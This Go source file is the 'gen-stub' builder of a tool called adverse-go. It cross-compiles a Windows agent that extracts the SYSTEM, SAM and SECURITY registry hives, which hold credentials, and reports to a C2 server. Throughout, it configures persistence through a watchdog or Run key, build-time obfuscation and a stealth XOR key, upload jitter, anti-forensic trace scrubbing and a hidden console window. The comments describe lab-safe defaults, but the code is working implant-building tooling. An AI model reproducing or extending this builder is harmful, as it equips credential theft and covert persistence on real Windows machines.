package main

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log/slog"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/ashwnn/adverse-go/internal/agent"
	"github.com/ashwnn/adverse-go/internal/cryptokeys"
)

// gen-stub cross-compiles a self-contained Windows agent: cmd/registryfil with
// the fleet config, per-build obfuscation seed, and build metadata embedded via
// -ldflags -X. No config file ships with the artifact.

const (
	adverseModulePath = "github.com/ashwnn/adverse-go"

	defaultStubHives = "SYSTEM,SAM,SECURITY"
	defaultGoTool    = "go"

	defaultPersistenceMode = "watchdog"
	defaultUploadJitterMs  = 250

	agentConfigLDVar   = adverseModulePath + "/internal/agent.embeddedConfigB64"
	obfuscateSeedLDVar = adverseModulePath + "/internal/obfuscate.BuildSeed"
	stealthKeyLDVar    = adverseModulePath + "/internal/stealth.XorKeyHex"
)

var seedRe = regexp.MustCompile(`^[0-9a-fA-F]{8}$`)

// agentConfigOptions is the shared input for gen-agent and gen-stub config
// generation. Marshaling goes through internal/agent.Config so the JSON schema
// cannot drift from the runtime parser.
type agentConfigOptions struct {
	Secret        string
	ServerURL     string
	Hives         []string
	ChunkSize     int
	MinDelayMs    int
	MaxDelayMs    int
	RealMode      bool
	TLSSkipVerify bool
	UserAgent     string

	PersistenceMode   string
	RunKeyName        string
	Spool             bool
	SpoolDir          string
	Shape             bool
	UploadJitterMs    int
	ScrubTraces       bool
	ExitAfterDelivery bool
}

// defaultAgentConfigOptions returns the lab-safe defaults shared by both
// generators.
func defaultAgentConfigOptions() agentConfigOptions {
	return agentConfigOptions{
		ServerURL:         defaultServerURL,
		Hives:             splitCSV(defaultStubHives),
		ChunkSize:         131072,
		MinDelayMs:        5000,
		MaxDelayMs:        15000,
		PersistenceMode:   defaultPersistenceMode,
		Spool:             true,
		Shape:             true,
		UploadJitterMs:    defaultUploadJitterMs,
		ScrubTraces:       false,
		ExitAfterDelivery: true,
	}
}

// buildAgentConfig assembles the canonical agent.Config and derives the
// agent_id exactly as gen-agent historically did: first 4 bytes of
// SHA-256(secret), hex-encoded (8 chars).
func buildAgentConfig(opts agentConfigOptions) (*agent.Config, string, error) {
	secretBytes, err := cryptokeys.Secret32(opts.Secret)
	if err != nil {
		return nil, "", fmt.Errorf("secret derivation failed: %w", err)
	}
	agentID := fmt.Sprintf("%x", secretBytes[:4])

	signPriv, err := cryptokeys.DeriveSignKey(secretBytes)
	if err != nil {
		return nil, "", fmt.Errorf("sign key derivation failed: %w", err)
	}
	signPubHex := fmt.Sprintf("%x", []byte(signPriv.Public().(ed25519.PublicKey)))

	cfg := &agent.Config{
		AgentID:       agentID,
		Secret:        opts.Secret,
		ServerURL:     opts.ServerURL,
		SignPubHex:    signPubHex,
		Hives:         opts.Hives,
		ChunkSize:     opts.ChunkSize,
		MinDelayMs:    opts.MinDelayMs,
		MaxDelayMs:    opts.MaxDelayMs,
		RealMode:      opts.RealMode,
		UserAgent:     opts.UserAgent,
		TLSSkipVerify: opts.TLSSkipVerify,
		Persistence: agent.PersistenceConfig{
			Mode:       opts.PersistenceMode,
			RunKeyName: opts.RunKeyName,
		},
		Spool: agent.SpoolConfig{
			Enabled: opts.Spool,
			Dir:     opts.SpoolDir,
		},
		Shaping: agent.ShapingConfig{
			Enabled:        opts.Shape,
			UploadJitterMs: opts.UploadJitterMs,
		},
		AntiForensic: agent.AntiForensicConfig{
			ScrubTraces: opts.ScrubTraces,
		},
		ExitAfterDelivery: opts.ExitAfterDelivery,
	}
	if err := cfg.Validate(); err != nil {
		return nil, "", fmt.Errorf("invalid agent config: %w", err)
	}
	return cfg, agentID, nil
}

// buildAgentConfigJSON returns compact standard JSON for the canonical config
// (the exact bytes embedded by gen-stub and written by gen-agent).
func buildAgentConfigJSON(opts agentConfigOptions) ([]byte, string, error) {
	cfg, agentID, err := buildAgentConfig(opts)
	if err != nil {
		return nil, "", err
	}
	raw, err := json.Marshal(cfg)
	if err != nil {
		return nil, "", fmt.Errorf("marshal agent config: %w", err)
	}
	return raw, agentID, nil
}

// ldflagInputs is the pure input for linker-flag construction.
type ldflagInputs struct {
	Version    string
	GitCommit  string
	BuildTime  string
	ConfigJSON []byte
	Seed       string
	WindowsGUI bool
}

// buildLDFlags renders the gen-stub linker flags. The embedded config is
// base64(std JSON agent config) so it survives the linker's string handling.
func buildLDFlags(in ldflagInputs) string {
	cfgB64 := base64.StdEncoding.EncodeToString(in.ConfigJSON)
	parts := []string{
		"-s", "-w", "-buildid=",
		"-X", "main.version=" + in.Version,
		"-X", "main.gitCommit=" + in.GitCommit,
		"-X", "main.buildTime=" + in.BuildTime,
		"-X", agentConfigLDVar + "=" + cfgB64,
		"-X", obfuscateSeedLDVar + "=" + in.Seed,
		"-X", stealthKeyLDVar + "=" + in.Seed,
	}
	if in.WindowsGUI {
		parts = append(parts, "-H", "windowsgui")
	}
	return strings.Join(parts, " ")
}

// resolveSeed validates an explicit seed or generates a crypto-random 4-byte
// (8 hex char) seed.
func resolveSeed(seed string) (string, error) {
	if seed == "" {
		b := make([]byte, 4)
		if _, err := rand.Read(b); err != nil {
			return "", fmt.Errorf("generate random seed: %w", err)
		}
		return hex.EncodeToString(b), nil
	}
	if !seedRe.MatchString(seed) {
		return "", fmt.Errorf("--seed must be exactly 8 hex characters, got %q", seed)
	}
	return strings.ToLower(seed), nil
}

// detectModuleRoot resolves the adverse-go module root. An explicit --src must
// point at the module; otherwise the directories above the adversed executable
// are searched first, then the current working directory.
func detectModuleRoot(srcArg string) (string, error) {
	if srcArg != "" {
		abs, err := filepath.Abs(srcArg)
		if err != nil {
			return "", fmt.Errorf("resolve --src: %w", err)
		}
		if !hasAdverseModule(abs) {
			return "", fmt.Errorf("--src %s is not the %s module root (go.mod not found or wrong module)", abs, adverseModulePath)
		}
		return abs, nil
	}

	var starts []string
	if exe, err := os.Executable(); err == nil {
		starts = append(starts, filepath.Dir(exe))
	}
	if wd, err := os.Getwd(); err == nil {
		starts = append(starts, wd)
	}
	for _, start := range starts {
		if root, ok := walkUpForModule(start); ok {
			return root, nil
		}
	}
	cwd, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("locate module root: %w", err)
	}
	return "", fmt.Errorf("could not locate module %s from the executable dir or %s; pass --src", adverseModulePath, cwd)
}

// walkUpForModule returns the nearest ancestor (inclusive) declaring the
// adverse-go module.
func walkUpForModule(start string) (string, bool) {
	dir, err := filepath.Abs(start)
	if err != nil {
		return "", false
	}
	for {
		if hasAdverseModule(dir) {
			return dir, true
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return "", false
		}
		dir = parent
	}
}

// hasAdverseModule reports whether dir/go.mod declares the adverse-go module.
func hasAdverseModule(dir string) bool {
	data, err := os.ReadFile(filepath.Join(dir, "go.mod"))
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "module ") {
			continue
		}
		return strings.TrimSpace(strings.TrimPrefix(line, "module ")) == adverseModulePath
	}
	return false
}

// resolveGo resolves the go tool to an absolute path via PATH.
func resolveGo(goArg string) (string, error) {
	if goArg == "" {
		goArg = defaultGoTool
	}
	path, err := exec.LookPath(goArg)
	if err != nil {
		return "", fmt.Errorf("go tool %q not found in PATH: %w", goArg, err)
	}
	return path, nil
}

// outputPath returns the explicit --out or the default stub-<agentID>.exe.
func outputPath(out, agentID string) string {
	if strings.TrimSpace(out) == "" {
		return fmt.Sprintf("stub-%s.exe", agentID)
	}
	return out
}

// buildGoArgs renders the go build argv (pure; unit-tested).
func buildGoArgs(outPath, ldflags string) []string {
	return []string{"build", "-trimpath", "-o", outPath, "-ldflags", ldflags, "./cmd/registryfil"}
}

// buildStubCommand assembles the cross-compile command: no shell, module root
// as working directory, Windows/amd64/static environment, output streamed to
// stderr.
func buildStubCommand(goTool, srcRoot, outPath, ldflags string) *exec.Cmd {
	cmd := exec.Command(goTool, buildGoArgs(outPath, ldflags)...)
	cmd.Dir = srcRoot
	cmd.Env = withEnv(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")
	cmd.Stdout = os.Stderr
	cmd.Stderr = os.Stderr
	return cmd
}

// withEnv overrides (not duplicates) the named environment entries. Duplicate
// env keys are interpreted inconsistently across platforms, so we replace.
func withEnv(environ []string, kv ...string) []string {
	overridden := make(map[string]bool, len(kv))
	for _, e := range kv {
		if i := strings.IndexByte(e, '='); i >= 0 {
			overridden[e[:i]] = true
		}
	}
	out := make([]string, 0, len(environ)+len(kv))
	for _, e := range environ {
		if i := strings.IndexByte(e, '='); i >= 0 && overridden[e[:i]] {
			continue
		}
		out = append(out, e)
	}
	return append(out, kv...)
}

// resolveGitCommit uses the build-time gitCommit when known, otherwise asks
// git in the module root; returns fallback on any failure.
func resolveGitCommit(srcRoot, fallback string) string {
	if fallback != "" && fallback != "unknown" {
		return fallback
	}
	out, err := exec.Command("git", "-C", srcRoot, "rev-parse", "--short", "HEAD").Output()
	if err != nil {
		return fallback
	}
	sha := strings.TrimSpace(string(out))
	if sha == "" {
		return fallback
	}
	return sha
}

type agentConfigFlags struct {
	persistence       *string
	runKeyName        *string
	spool             *bool
	spoolDir          *string
	shape             *bool
	uploadJitterMs    *int
	scrubTraces       *bool
	exitAfterDelivery *bool
}

func addAgentConfigFlags(fs *flag.FlagSet, defaultExitAfterDelivery bool) *agentConfigFlags {
	return &agentConfigFlags{
		persistence:       fs.String("persistence", defaultPersistenceMode, "persistence mode: none|watchdog|runkey|both"),
		runKeyName:        fs.String("run-key-name", "", "Run value name for persistence=runkey|both (default: runtime default)"),
		spool:             fs.Bool("spool", true, "enable encrypted on-disk result spool (pass --spool=false to disable)"),
		spoolDir:          fs.String("spool-dir", "", "spool directory (default: runtime default)"),
		shape:             fs.Bool("shape", true, "shape upload traffic with jitter (pass --shape=false to disable)"),
		uploadJitterMs:    fs.Int("upload-jitter-ms", defaultUploadJitterMs, "extra upload jitter in milliseconds (>= 0)"),
		scrubTraces:       fs.Bool("scrub-traces", false, "scrub forensic traces"),
		exitAfterDelivery: fs.Bool("exit-after-delivery", defaultExitAfterDelivery, "exit after successful result delivery (pass =false to stay resident)"),
	}
}

func (f *agentConfigFlags) validate() error {
	if err := validatePersistenceMode(*f.persistence); err != nil {
		return err
	}
	return validateUploadJitter(*f.uploadJitterMs)
}

func (f *agentConfigFlags) apply(opts *agentConfigOptions) {
	opts.PersistenceMode = *f.persistence
	opts.RunKeyName = *f.runKeyName
	opts.Spool = *f.spool
	opts.SpoolDir = *f.spoolDir
	opts.Shape = *f.shape
	opts.UploadJitterMs = *f.uploadJitterMs
	opts.ScrubTraces = *f.scrubTraces
	opts.ExitAfterDelivery = *f.exitAfterDelivery
}

var validPersistenceModes = map[string]bool{
	"none":     true,
	"watchdog": true,
	"runkey":   true,
	"both":     true,
}

func validatePersistenceMode(mode string) error {
	if !validPersistenceModes[mode] {
		return fmt.Errorf("--persistence must be one of none, watchdog, runkey, both, got %q", mode)
	}
	return nil
}

func validateUploadJitter(ms int) error {
	if ms < 0 {
		return fmt.Errorf("--upload-jitter-ms must be >= 0, got %d", ms)
	}
	return nil
}

// cmdGenStub builds a self-contained Windows agent stub.
func cmdGenStub(args []string) {
	fs := flag.NewFlagSet("gen-stub", flag.ExitOnError)
	_ = fs.String("secret", "", "pre-shared secret hex (prefer --secret-file or ADVERSE_SECRET)")
	_ = fs.String("secret-file", "", "file containing the pre-shared secret hex")
	serverURL := fs.String("server-url", defaultServerURL, "C2 server URL")
	hives := fs.String("hives", defaultStubHives, "comma-separated hive list")
	chunkSize := fs.Int("chunk-size", 131072, "extract chunk size (bytes)")
	minDelay := fs.Int("min-delay-ms", 5000, "minimum beacon delay (ms)")
	maxDelay := fs.Int("max-delay-ms", 15000, "maximum beacon delay (ms)")
	realMode := fs.Bool("real-mode", false, "enable real extraction")
	cfgFlags := addAgentConfigFlags(fs, true)
	windowsGUI := fs.Bool("windowsgui", true, "build a Windows GUI-subsystem binary (-H windowsgui inside -ldflags; strips the console window)")
	tlsSkipVerify := fs.Bool("tls-skip-verify", false, "skip TLS certificate verification")
	userAgent := fs.String("user-agent", "", "HTTP User-Agent override")
	out := fs.String("out", "", "output executable path (default stub-<agentID>.exe)")
	src := fs.String("src", "", "module root (default: auto-detect)")
	goTool := fs.String("go", defaultGoTool, "go tool path")
	seed := fs.String("seed", "", "8-hex per-build seed (default: crypto-random)")
	fs.Parse(args)

	if err := cfgFlags.validate(); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		fs.Usage()
		os.Exit(2)
	}

	sec := resolveSecret(fs)
	if sec == "" {
		fmt.Fprintln(os.Stderr, "error: fleet secret is required (--secret-file, ADVERSE_SECRET, or --secret)")
		fs.Usage()
		os.Exit(2)
	}
	if fs.Lookup("secret-file").Value.String() == "" && fs.Lookup("secret").Value.String() != "" {
		slog.Warn("fleet secret passed on argv; visible in process listings - use --secret-file")
	}

	seedVal, err := resolveSeed(*seed)
	if err != nil {
		slog.Error("seed invalid", "err", err)
		os.Exit(2)
	}
	srcRoot, err := detectModuleRoot(*src)
	if err != nil {
		slog.Error("module root not found", "err", err)
		os.Exit(1)
	}
	goBin, err := resolveGo(*goTool)
	if err != nil {
		slog.Error("go tool not found", "err", err)
		os.Exit(1)
	}

	opts := defaultAgentConfigOptions()
	opts.Secret = sec
	opts.ServerURL = *serverURL
	opts.Hives = splitCSV(*hives)
	opts.ChunkSize = *chunkSize
	opts.MinDelayMs = *minDelay
	opts.MaxDelayMs = *maxDelay
	opts.RealMode = *realMode
	opts.TLSSkipVerify = *tlsSkipVerify
	opts.UserAgent = *userAgent
	cfgFlags.apply(&opts)

	cfgJSON, agentID, err := buildAgentConfigJSON(opts)
	if err != nil {
		slog.Error("agent config build failed", "err", err)
		os.Exit(1)
	}

	ldflags := buildLDFlags(ldflagInputs{
		Version:    version,
		GitCommit:  resolveGitCommit(srcRoot, gitCommit),
		BuildTime:  time.Now().UTC().Format(time.RFC3339),
		ConfigJSON: cfgJSON,
		Seed:       seedVal,
		WindowsGUI: *windowsGUI,
	})

	outPath := outputPath(*out, agentID)
	if abs, err := filepath.Abs(outPath); err == nil {
		outPath = abs
	}

	slog.Info("building agent stub", "agent_id", agentID, "out", outPath, "src", srcRoot, "seed", seedVal)
	cmd := buildStubCommand(goBin, srcRoot, outPath, ldflags)
	if err := cmd.Run(); err != nil {
		slog.Error("go build failed", "err", err, "out", outPath)
		os.Exit(1)
	}

	info, err := os.Stat(outPath)
	if err != nil {
		slog.Error("stub stat failed", "err", err)
		os.Exit(1)
	}
	fmt.Printf("wrote %s (agent %s, seed %s, %d bytes)\n", outPath, agentID, seedVal, info.Size())
}
